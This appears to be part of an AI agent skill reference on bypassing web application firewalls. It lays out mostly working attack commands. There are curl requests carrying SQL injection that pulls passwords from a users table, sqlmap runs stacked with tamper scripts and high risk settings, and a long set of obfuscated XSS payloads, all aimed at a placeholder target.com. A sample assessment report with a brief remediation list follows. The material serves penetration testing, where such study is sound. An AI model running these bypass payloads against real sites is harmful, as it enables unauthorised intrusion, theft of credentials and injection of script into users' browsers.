# performing-web-application-firewall-bypass — 详细参考（由 SKILL.md 拆分）

# XML-wrapped payloads
curl -X POST http://target.com/api/data \
  -H "Content-Type: application/xml" \
  -d "<data><id>1' UNION SELECT password FROM users--</id></data>"
```

### Step 5 — Use SQLMap Tamper Scripts
```bash
# SQLMap with built-in tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=between,randomcase,space2comment

# Common tamper scripts for WAF bypass:
sqlmap -u "http://target.com/page?id=1" --tamper=charunicodeencode
sqlmap -u "http://target.com/page?id=1" --tamper=space2mssqlhash
sqlmap -u "http://target.com/page?id=1" --tamper=percentage
sqlmap -u "http://target.com/page?id=1" --tamper=chardoubleencode,between

# Multiple tamper scripts combined
sqlmap -u "http://target.com/page?id=1" \
  --tamper=randomcase,space2comment,between,charunicodeencode \
  --random-agent --level 5 --risk 3

# Custom WAF bypass profile
sqlmap -u "http://target.com/page?id=1" \
  --tamper=space2comment,randomcase \
  --delay=2 --random-agent \
  --technique=B --batch
```

### Step 6 — XSS WAF Bypass Techniques
```bash
# Case variation
curl "http://target.com/page?q=<ScRiPt>alert(1)</ScRiPt>"

# Event handler alternatives
curl "http://target.com/page?q=<img src=x oNerRor=alert(1)>"
curl "http://target.com/page?q=<svg/onload=alert(1)>"
curl "http://target.com/page?q=<body onpageshow=alert(1)>"
curl "http://target.com/page?q=<marquee onstart=alert(1)>"

# JavaScript URI scheme
curl "http://target.com/page?q=<a href=javascript:alert(1)>click</a>"

# Template literal syntax
curl "http://target.com/page?q=<script>alert\x601\x60</script>"

# Concatenation-based bypass
curl "http://target.com/page?q=<script>al\u0065rt(1)</script>"

# HTML encoding within attributes
curl "http://target.com/page?q=<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"

# Double encoding
curl "http://target.com/page?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| Signature Evasion | Obfuscating payloads to avoid matching WAF regex patterns |
| Encoding Bypass | Using URL, Unicode, or HTML encoding to disguise malicious characters |
| Protocol-Level Bypass | Exploiting HTTP protocol features (chunked encoding, method override) |
| Tamper Scripts | SQLMap modules that transform payloads to evade specific WAF rules |
| Content-Type Confusion | Sending payloads in unexpected content types the WAF does not inspect |
| Parameter Pollution | Splitting payloads across duplicate parameters to evade per-parameter inspection |
| Behavioral vs Signature | WAF detection modes: pattern matching (bypassable) vs. anomaly detection (harder) |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| wafw00f | WAF fingerprinting and identification |
| SQLMap | Automated SQL injection with WAF bypass tamper scripts |
| waf-bypass.com | Community-maintained WAF bypass payload database |
| Awesome-WAF | Curated GitHub repository of WAF bypass techniques |
| Burp Suite | HTTP proxy for manual payload crafting and WAF response analysis |
| XSStrike | XSS scanner with WAF detection and bypass capabilities |

## Common Scenarios

1. **SQLi Through JSON** — Bypass WAF by sending SQL injection payloads inside JSON request bodies that are not inspected by the WAF rules
2. **XSS via Event Handlers** — Use alternative HTML event handlers (onpageshow, onanimationstart) not covered by WAF signature rules
3. **Encoding Chain Bypass** — Apply multiple layers of encoding (URL + Unicode + HTML entity) to evade each decoding layer of the WAF
4. **Chunked Transfer Bypass** — Split malicious payload across HTTP chunked transfer encoding segments to avoid pattern matching
5. **Method Override** — Send attack payloads via PUT/PATCH methods or custom headers that WAF does not inspect

## Output Format

```
## WAF Bypass Assessment Report
- **Target**: http://target.com
- **WAF Identified**: Cloudflare (via cf-ray header)
- **Bypass Achieved**: Yes

### WAF Detection Results
| Payload Type | Blocked | Bypass Found |
|-------------|---------|-------------|
| Basic SQLi | Yes | Yes (JSON encoding) |
| UNION SELECT | Yes | Yes (inline comments) |
| XSS <script> | Yes | Yes (SVG onload) |
| Path Traversal | No | N/A (not blocked) |

### Successful Bypass Payloads
| # | Original (Blocked) | Bypass Payload | Technique |
|---|-------------------|---------------|-----------|
| 1 | 1' OR 1=1-- | {"id":"1' OR 1=1--"} | JSON content-type |
| 2 | UNION SELECT | /*!50000UNION*/ /*!50000SELECT*/ | MySQL version comments |
| 3 | <script>alert(1)</script> | <svg/onload=alert(1)> | Alternative tag+event |

### Remediation
- Enable JSON body inspection in WAF rules
- Implement behavioral analysis alongside signature detection
- Add rules for uncommon HTML tags and event handlers
- Enable deep content inspection for all HTTP methods
- Implement request normalization before rule evaluation
```
